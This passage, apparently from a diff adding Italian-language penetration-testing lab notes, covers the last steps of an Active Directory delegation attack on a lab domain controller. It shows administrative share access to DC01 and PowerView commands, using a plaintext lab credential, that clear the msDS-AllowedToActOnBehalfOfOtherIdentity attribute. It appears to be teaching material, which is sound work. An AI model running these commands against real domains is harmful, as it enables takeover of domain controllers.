+        Kdc Called:
+```
+
+Ora possiamo elencare i file sul computer di destinazione come amministratore.
+```
+PS C:\Tools> ls \\dc01.inlanefreight.local\c$
+
+    Directory: \\dc01.inlanefreight.local\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2022  10:20 AM                PerfLogs
+d-r---        10/6/2021   3:50 PM                Program Files
+d-----        9/15/2018   4:06 AM                Program Files (x86)
+d-----        3/30/2023  11:08 AM                Shares
+d-----        3/30/2023   3:13 PM                Unconstrained
+d-r---         4/3/2023   8:56 AM                Users
+d-----       10/14/2022   6:49 AM                Windows
+```
+
+Per cancellare l'attributo ```msDS-AllowedToActOnBehalfOfOtherIdentity```, possiamo utilizzare i seguenti comandi PowerShell:
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
+PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Extracted domain 'INLANEFREIGHT.LOCAL' from 'CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL'
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
+Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
+VERBOSE: [Set-DomainObject] Clearing 'msDS-AllowedToActOnBehalfOfOtherIdentity' for object 'DC01$'
+```
+
 
 ### Esempio
 - WEB-SRV = Service A — hai compromesso questa macchina, sei local admin
